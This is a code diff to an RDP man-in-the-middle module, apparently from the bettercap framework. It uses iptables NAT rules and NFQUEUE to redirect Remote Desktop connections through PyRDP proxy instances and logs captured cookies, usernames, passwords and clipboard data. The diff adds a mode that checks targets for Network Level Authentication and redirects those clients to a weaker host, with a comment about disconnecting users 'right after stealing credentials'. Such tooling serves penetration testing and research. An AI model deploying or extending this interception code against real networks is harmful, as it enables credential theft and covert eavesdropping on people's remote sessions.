@@ -1,16 +1,17 @@
 package rdp_proxy
 
 import (
+    "bufio"
+    "bytes"
     "fmt"
     "os/exec"
+    "io"
     "io/ioutil"
     golog "log"
     "net"
-    "syscall"
-    "bufio"
-    "io"
     "regexp"
-    "bytes"
+    "strings"
+    "syscall"
 
     "github.com/bettercap/bettercap/core"
     "github.com/bettercap/bettercap/network"
@@ -23,16 +24,20 @@ import (
 
 type RdpProxy struct {
     session.SessionModule
-    targets   []net.IP
-    done      chan bool
-    queue     *nfqueue.Queue
-    queueNum  int
-    port      int
-    startPort int
-    cmd       string
-    regexp    string
-    compiled  *regexp.Regexp
-    active    map[string]exec.Cmd
+    targets      []net.IP
+    done         chan bool
+    queue        *nfqueue.Queue
+    queueNum     int
+    port         int
+    startPort    int
+    cmd          string
+    secCheck     string
+    nlaMode      string
+    redirectIP   net.IP
+    redirectPort int
+    regexp       string
+    compiled     *regexp.Regexp
+    active       map[string]exec.Cmd
 }
 
 var mod *RdpProxy
@@ -47,7 +52,11 @@ func NewRdpProxy(s *session.Session) *RdpProxy {
         port:          3389,
         startPort:     40000,
         cmd:           "pyrdp-mitm.py",
-        regexp:        "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password)",
+        secCheck:      "",
+        nlaMode:       "IGNORE",
+        redirectIP:    make(net.IP, 0),
+        redirectPort:  3389,
+        regexp:        "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password|error)",
         active:        make(map[string]exec.Cmd),
     }
 
@@ -61,6 +70,7 @@ func NewRdpProxy(s *session.Session) *RdpProxy {
             return mod.Stop()
         }))
 
+// Required parameters
 mod.AddParam(session.NewIntParameter("rdp.proxy.queue.num", "0", "NFQUEUE number to bind to."))
 mod.AddParam(session.NewIntParameter("rdp.proxy.port", "3389", "RDP port to intercept."))
 mod.AddParam(session.NewIntParameter("rdp.proxy.start", "40000", "Starting port for PyRDP sessions."))
@@ -68,6 +78,12 @@ mod.AddParam(session.NewStringParameter("rdp.proxy.command", "pyrdp-mitm.py", ""
 mod.AddParam(session.NewStringParameter("rdp.proxy.out", "./", "", "The output directory for PyRDP artifacts."))
 mod.AddParam(session.NewStringParameter("rdp.proxy.targets", session.ParamSubnet, "", "Comma separated list of IP addresses to proxy to, also supports nmap style IP ranges."))
 mod.AddParam(session.NewStringParameter("rdp.proxy.regexp", "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password)", "", "Print PyRDP logs matching this regular expression."))
+// Optional paramaters
+mod.AddParam(session.NewStringParameter("rdp.proxy.nla.seccheck", "", "", "Path to rdp-sec-check.pl. Allows more complex exploits when NLA is enforced (optional)."))
+mod.AddParam(session.NewStringParameter("rdp.proxy.nla.mode", "IGNORE", "(IGNORE|RELAY|REDIRECT)", "Specify how to handle connections to a NLA-enabled host. Require rdp.proxy.nla.seccheck."))
+mod.AddParam(session.NewStringParameter("rdp.proxy.nla.redirectip", "", "", "Specify IP to redirect clients that connects to NLA targets. Require rdp.proxy.nla.mode REDIRECT"))
+mod.AddParam(session.NewIntParameter("rdp.proxy.nla.redirectport", "3389", "Specify port to redirect clients that connects to NLA targets. Require rdp.proxy.nla.mode REDIRECT"))
+
     return mod
 }
 
@@ -95,6 +111,48 @@ func (mod *RdpProxy) isTarget(ip string) bool {
     return false
 }
 
+func (mod *RdpProxy) isNLAEnforced(target string) (nla bool, err error) {
+    if mod.secCheck != "" {
+
+        output, err := core.Exec(mod.secCheck, []string{
+            target,
+        })
+
+        // Hybrid means enforce NLA + SSL
+        if strings.Contains(output, "HYBRID_REQUIRED_BY_SERVER") {
+            return true, err
+        }
+    }
+    return false, err
+}
+
+func (mod *RdpProxy) startProxyInstance(src string, sport string, dst string, dport string) {
+    target := fmt.Sprintf("%s:%s", dst, dport)
+    ips := fmt.Sprintf("[%s:%s -> %s:%s]", src, sport, dst, dport)
+
+    // 3.1. Create a proxy agent and firewall rules.
+    args := []string{
+        "-l", fmt.Sprintf("%d", mod.startPort),
+        // "-o", mod.outpath,
+        // "-i", "-d"
+        target,
+    }
+
+    //   3.2. Spawn PyRDP proxy instance
+    cmd := exec.Command(mod.cmd, args...)
+    stderrPipe, _ := cmd.StderrPipe()
+
+    if err := cmd.Start(); err != nil {
+        // XXX: Failed to start the rdp proxy... accept connection transparently and log?
+        mod.Info("%v", err.Error())
+    }
+
+    // Use goroutines to keep logging each instance of PyRDP
+    go mod.filterLogs(ips, stderrPipe)
+
+    mod.active[target] = *cmd
+}
+
 // Filter PyRDP logs to only show those that matches mod.regexp
 func (mod *RdpProxy) filterLogs(prefix string, output io.ReadCloser) {
     scanner := bufio.NewScanner(output)
@@ -115,26 +173,26 @@ func (mod *RdpProxy) filterLogs(prefix string, output io.ReadCloser) {
 }
 
 // Adds the firewall rule for proxy instance.
-func (mod *RdpProxy) doProxy(addr string, port string, enable bool) (err error) {
+func (mod *RdpProxy) doProxy(dst string, proxyPort string) (err error) {
     _, err = core.Exec("iptables", []string{
         "-t", "nat",
         "-I", "BCAPRDP", "1",
-        "-d", addr,
+        "-d", dst,
         "-p", "tcp",
         "--dport", fmt.Sprintf("%d", mod.port),
         "-j", "REDIRECT",
-        "--to-ports", port,
+        "--to-ports", proxyPort,
     })
     return
 }
 
-func (mod *RdpProxy) doReturn(dst string, dport gopacket.Endpoint, enable bool) (err error) {
+func (mod *RdpProxy) doReturn(dst string, dport string) (err error) {
     _, err = core.Exec("iptables", []string{
         "-t", "nat",
         "-I", "BCAPRDP", "1",
         "-p", "tcp",
         "-d", dst,
-        "--dport", fmt.Sprintf("%v", dport),
+        "--dport", dport,
         "-j", "RETURN",
     })
     return
@@ -189,8 +247,20 @@ func (mod *RdpProxy) Configure() (err error) {
         return
     } else if err, mod.regexp = mod.StringParam("rdp.proxy.regexp"); err != nil {
         return
+    } else if err, mod.secCheck = mod.StringParam("rdp.proxy.nla.seccheck"); err != nil {
+        return
+    } else if err, mod.nlaMode = mod.StringParam("rdp.proxy.nla.mode"); err != nil {
+        return
+    } else if err, mod.redirectIP = mod.IPParam("rdp.proxy.nla.redirectip"); err != nil {
+        return
+    } else if err, mod.redirectPort = mod.IntParam("rdp.proxy.nla.redirectport"); err != nil {
+        return
     } else if mod.regexp != "" {
         if mod.compiled, err = regexp.Compile(mod.regexp); err != nil {
+            return
+        }
+    } else if mod.secCheck != "" {
+        if _, err = exec.LookPath(mod.secCheck); err != nil {
             return
         }
     } else if _, err = exec.LookPath(mod.cmd); err != nil {
@@ -224,45 +294,54 @@ func (mod *RdpProxy) Configure() (err error) {
 func (mod *RdpProxy) handleRdpConnection(payload *nfqueue.Payload) int {
     // 1. Determine source and target addresses.
     p := gopacket.NewPacket(payload.Data, layers.LayerTypeIPv4, gopacket.Default)
-    src, sport := p.NetworkLayer().NetworkFlow().Src(), p.TransportLayer().TransportFlow().Src()
-    dst, dport := p.NetworkLayer().NetworkFlow().Dst(), p.TransportLayer().TransportFlow().Dst()
+    src, sport := p.NetworkLayer().NetworkFlow().Src().String(), fmt.Sprintf("%s", p.TransportLayer().TransportFlow().Src())
+    dst, dport := p.NetworkLayer().NetworkFlow().Dst().String(), fmt.Sprintf("%s", p.TransportLayer().TransportFlow().Dst())
 
-    ips := fmt.Sprintf("[%v:%v -> %v:%v]", src, sport, dst, dport)
+    // TODO : Log everything inside the events stream
+    ips := fmt.Sprintf("[%s:%s -> %s:%s]", src, sport, dst, dport)
 
-    if mod.isTarget(dst.String()) {
-        target := fmt.Sprintf("%v:%v", dst, dport)
+    if mod.isTarget(dst) {
+        target := fmt.Sprintf("%s:%s", dst, dport)
 
         // 2. Check if the destination IP already has a PyRDP session active, if so, do nothing.
         if _, ok :=  mod.active[target]; !ok {
-            // 3.1. Otherwise, create a proxy agent and firewall rules.
-            args := []string{
-                "-l", fmt.Sprintf("%d", mod.startPort),
-                // "-o", mod.outpath,
-                // "-i", "-d"
-                target,
+            targetNLA, _ := mod.isNLAEnforced(target)
+
+            // Only if seccheck is set
+            if targetNLA {
+                switch mod.nlaMode {
+                case "RELAY":
+                    mod.Info("%s Target has NLA enabled and mode RELAY, unimplemented", ips)
+                case "REDIRECT":
+                    // TODO : Find a way to disconnect user right after stealing credentials.
+                    // Start a PyRDP instance to the preconfigured vulnerable host
+                    // and forward packets to the target to this host instead
+                    mod.Info("%s Target has NLA enabled and mode REDIRECT, forwarding to the vulnerable host...", ips)
+                    mod.startProxyInstance(src, sport, mod.redirectIP.String(), fmt.Sprintf("%d", mod.redirectPort))
+
+                    mod.doProxy(dst, fmt.Sprintf("%d", mod.startPort))
+                    mod.startPort += 1
+                default:
+                    // Add an exception in the firewall to avoid intercepting packets to this destination and port
+                    mod.Info("%s Target has NLA enabled and mode IGNORE, won't intercept", ips)
+
+                    mod.doReturn(dst, dport)
+                }
+            } else {
+                // Starts a PyRDP instance.
+                // Won't work if the target has NLA but rdp-sec-check isn't set
+                mod.startProxyInstance(src, sport, dst, dport)
+
+                // Add a NAT rule in the firewall for this particular target IP
+                mod.doProxy(dst, fmt.Sprintf("%d", mod.startPort))
+                mod.startPort += 1
             }
-
-            //   3.2. Spawn PyRDP proxy instance
-            cmd := exec.Command(mod.cmd, args...)
-            stderrPipe, _ := cmd.StderrPipe()
-
-            if err := cmd.Start(); err != nil {
-                // XXX: Failed to start the rdp proxy... accept connection transparently and log?
-            }
-
-            // Use goroutines to keep logging each instance of PyRDP
-            go mod.filterLogs(ips, stderrPipe)
-
-            //   3.3. Add a NAT rule in the firewall for this particular target IP
-            mod.doProxy(dst.String(), fmt.Sprintf("%d", mod.startPort), true)
-            mod.active[target] = *cmd
-            mod.startPort += 1
         }
     } else {
         mod.Info("Non-target, won't intercept %s", ips)
 
         // Add an exception in the firewall to avoid intercepting packets to this destination and port
-        mod.doReturn(dst.String(), dport, true)
+        mod.doReturn(dst, dport)
     }
 
     // Force a retransmit to trigger the new firewall rules. (TODO: Find a more efficient way to do this.)
